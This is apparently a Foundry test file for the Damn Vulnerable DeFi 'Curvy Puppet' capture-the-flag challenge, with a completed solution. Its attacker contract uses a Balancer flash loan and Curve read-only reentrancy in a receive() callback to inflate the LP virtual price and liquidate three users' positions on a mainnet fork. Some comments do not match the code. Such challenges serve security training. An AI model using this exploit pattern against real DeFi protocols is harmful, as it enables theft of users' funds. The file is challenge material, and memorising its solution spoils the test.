// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        /**
         * VULNERABILITY: LP Token Price Manipulation via Curve Pool Imbalance
         * 
         * The lending contract uses:
         *   LP_price = ETH_price * get_virtual_price()
         * 
         * The virtual_price is calculated as D/totalSupply where D is the invariant.
         * By doing massive imbalanced operations on the Curve pool, we can temporarily
         * inflate the virtual_price, making borrowed LP tokens appear more valuable
         * than the DVT collateral, triggering liquidations.
         * 
         * The stETH/ETH pool uses the old Vyper implementation which is vulnerable
         * to read-only reentrancy during remove_liquidity calls.
         * 
         * Attack Strategy:
         * 1. Flash loan massive ETH from Aave
         * 2. Add liquidity imbalanced (ETH only) to get LP tokens
         * 3. Call remove_liquidity (ETH+stETH) which has reentrancy window
         * 4. During ETH callback, virtual_price is inflated (LP burned, D not updated)
         * 5. Liquidate all positions at inflated borrow value
         * 6. Repay flash loan and return profits
         */
        
        // Deploy attacker contract
        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
            lending,
            curvePool,
            weth,
            stETH,
            IERC20(curvePool.lp_token()),
            IERC20(address(dvt)),
            permit2,
            treasury,
            alice,
            bob,
            charlie
        );
        
        // Transfer treasury's assets to attacker
        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE);
        
        // Execute the attack
        attacker.attack();
        
        // Transfer rescued assets back to treasury
        attacker.cleanup();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

// Interface for Balancer flash loans (free!)
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract CurvyPuppetAttacker {
    CurvyPuppetLending public lending;
    IStableSwap public curvePool;
    WETH public weth;
    IERC20 public stETH;
    IERC20 public lpToken;
    IERC20 public dvt;
    IPermit2 public permit2;
    address public treasury;
    address public alice;
    address public bob;
    address public charlie;
    
    // Balancer Vault on mainnet (fee-free flash loans) 
    IBalancerVault constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    // Lido for staking ETH -> stETH
    address constant LIDO = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    
    bool private attacking;
    uint256 private flashLoanAmount;
    
    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        WETH _weth,
        IERC20 _stETH,
        IERC20 _lpToken,
        IERC20 _dvt,
        IPermit2 _permit2,
        address _treasury,
        address _alice,
        address _bob,
        address _charlie
    ) {
        lending = _lending;
        curvePool = _curvePool;
        weth = _weth;
        stETH = _stETH;
        lpToken = _lpToken;
        dvt = _dvt;
        permit2 = _permit2;
        treasury = _treasury;
        alice = _alice;
        bob = _bob;
        charlie = _charlie;
    }
    
    function attack() external {
        // Setup permit2 for liquidation
        lpToken.approve(address(permit2), type(uint256).max);
        permit2.approve(address(lpToken), address(lending), uint160(10e18), uint48(block.timestamp + 1));
        
        // Flash loan max WETH from Balancer (~38k available)
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37_000e18;
        flashLoanAmount = amounts[0];
        
        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }
    
    // Balancer flash loan callback  
    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external {
        require(msg.sender == address(balancerVault), "Invalid caller");
        
        // Step 1: Unwrap all WETH to ETH  
        weth.withdraw(weth.balanceOf(address(this)));
        
        // Step 2: Stake some ETH to get stETH via Lido
        uint256 ethBalance = address(this).balance;
        uint256 ethToStake = ethBalance / 2;
        (bool success,) = LIDO.call{value: ethToStake}("");
        require(success, "Lido stake failed");
        
        // Step 3: Add both ETH and stETH liquidity to Curve pool
        uint256 stEthBal = stETH.balanceOf(address(this));
        stETH.approve(address(curvePool), stEthBal);
        uint256[2] memory addAmounts = [address(this).balance, stEthBal];
        curvePool.add_liquidity{value: address(this).balance}(addAmounts, 0);
        
        // Step 4: Use remove_liquidity_one_coin - balance updated AFTER callback
        attacking = true;
        curvePool.remove_liquidity_one_coin(lpToken.balanceOf(address(this)) - 4e18, 0, 0);
        attacking = false;
        
        // Step 5: Exchange any remaining stETH to ETH
        stEthBal = stETH.balanceOf(address(this));
        if (stEthBal > 0) {
            stETH.approve(address(curvePool), stEthBal);
            curvePool.exchange(1, 0, stEthBal, 0);
        }
        
        // Step 6: Wrap ETH and repay flash loan
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(balancerVault), flashLoanAmount);
    }
    
    receive() external payable {
        if (!attacking) return;
        
        // During remove_liquidity_one_coin callback:
        // LP burned but balance not yet updated = inflated virtual_price
        lending.liquidate(alice);
        lending.liquidate(bob);
        lending.liquidate(charlie);
    }
    
    function cleanup() external {
        // Transfer all DVT to treasury
        uint256 dvtBalance = dvt.balanceOf(address(this));
        if (dvtBalance > 0) dvt.transfer(treasury, dvtBalance);
        
        // Transfer remaining WETH to treasury  
        if (address(this).balance > 0) weth.deposit{value: address(this).balance}();
        uint256 wethBalance = weth.balanceOf(address(this));
        if (wethBalance > 0) weth.transfer(treasury, wethBalance);
        
        // Transfer remaining LP tokens to treasury
        uint256 lpBalance = lpToken.balanceOf(address(this));
        if (lpBalance > 0) lpToken.transfer(treasury, lpBalance);
        
        // Transfer any stETH to treasury
        uint256 stEthBalance = stETH.balanceOf(address(this));
        if (stEthBalance > 0) stETH.transfer(treasury, stEthBalance);
    }
}
